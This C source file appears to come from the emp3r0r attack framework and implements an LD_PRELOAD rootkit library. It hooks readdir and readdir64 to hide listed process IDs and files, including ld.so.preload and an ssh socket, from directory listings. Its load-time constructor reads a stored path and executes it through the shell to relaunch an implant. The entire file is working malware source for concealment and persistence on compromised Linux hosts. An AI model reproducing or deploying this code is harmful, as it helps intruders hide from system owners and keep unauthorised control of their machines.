#define _GNU_SOURCE
#include "libemp3r0r.h"
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

// trim trailing whitespace from a string
void trim_str(char* buffer)
{
    buffer[strcspn(buffer, "\r\n")] = 0;
}

int is_file_exist(const char* path)
{
    if (access(path, F_OK) != -1) {
        return 1;
    }
    return 0;
}

// check if this pid is present in /dev/shm/emp PID list
int is_hidden(const char* pid)
{
    if (!is_file_exist(SHM_FILE)) {
        return 0;
    }

    FILE* fd = fopen(SHM_FILE, "r");
    int bufferLength = 255;
    char buffer[bufferLength];
    while (fgets(buffer, bufferLength, fd)) {
        trim_str(buffer);
        if (strncmp(pid, buffer, strlen(pid)) == 0) {
            fclose(fd);
            return 1;
        }
    }
    fclose(fd);
    return 0;
}

// Get a directory name given a DIR* handle
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

DIR* opendir(const char* name)
{
    static DIR* (*orig_opendir)(const char*) = NULL;
    if (!orig_opendir)
        orig_opendir = dlsym(RTLD_NEXT, "opendir");

    DIR* result = orig_opendir(name);

    return result;
}

struct dirent64* readdir64(DIR* dirp)
{
    static struct dirent64* (*orig_readdir64)(DIR * dirp) = NULL;
    if (!orig_readdir64)
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64* result = NULL;
    DIR* proc_1 = opendir("/proc/1");
    struct dirent64* temp = orig_readdir64(proc_1);

    char pwd[1024];
    if (get_dir_name(dirp, pwd, 1024)) {
        result = orig_readdir64(dirp);
        if (!result) {
            closedir(proc_1);
            return NULL;
        }

        // processes
        if (strcmp(pwd, "/proc") == 0) {
            if (is_hidden(result->d_name)) {
                closedir(proc_1);
                return temp;
            }
        }

        // other directories
        if (strstr(result->d_name, HIDE_ME)
            || strcmp(result->d_name, "e.lock") == 0
            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0
            || strcmp(result->d_name, "ld.so.preload") == 0
            || strcmp(result->d_name, "...") == 0) {
            closedir(proc_1);
            return temp;
        }
    }

    closedir(proc_1);
    return result;
}

struct dirent* readdir(DIR* dirp)
{
    static struct dirent* (*orig_readdir)(DIR * dirp) = NULL;
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent* result = NULL;
    DIR* proc_1 = opendir("/proc/1");
    struct dirent* temp = orig_readdir(proc_1);

    char pwd[1024];
    if (get_dir_name(dirp, pwd, 1024)) {
        result = orig_readdir(dirp);
        if (!result) {
            closedir(proc_1);
            return NULL;
        }

        // processes
        if (strcmp(pwd, "/proc") == 0) {
            if (is_hidden(result->d_name)) {
                closedir(proc_1);
                return temp;
            }
        }

        // other directories
        if (strstr(result->d_name, HIDE_ME)
            || strcmp(result->d_name, "e.lock") == 0
            || strcmp(result->d_name, "ssh-s6Y4tDtahIuL") == 0
            || strcmp(result->d_name, "ld.so.preload") == 0
            || strcmp(result->d_name, "...") == 0) {
            closedir(proc_1);
            return temp;
        }
    }

    closedir(proc_1);
    return result;
}

void run_emp(const char* path)
{
    if (!execlp("sh", "-c", path, (char*)0)) {
        return;
    }
}

void __attribute__((constructor)) initLibrary(void)
{
    // get EmpPATH
    if (is_file_exist(EMP_FILE)) {
        FILE* fd = fopen(EMP_FILE, "r");
        char buf[255];
        fgets(buf, 255, fd);
        trim_str(buf);
        if (is_file_exist(buf))
            run_emp(buf);
    }
}

void __attribute__((destructor)) cleanUpLibrary(void)
{
}
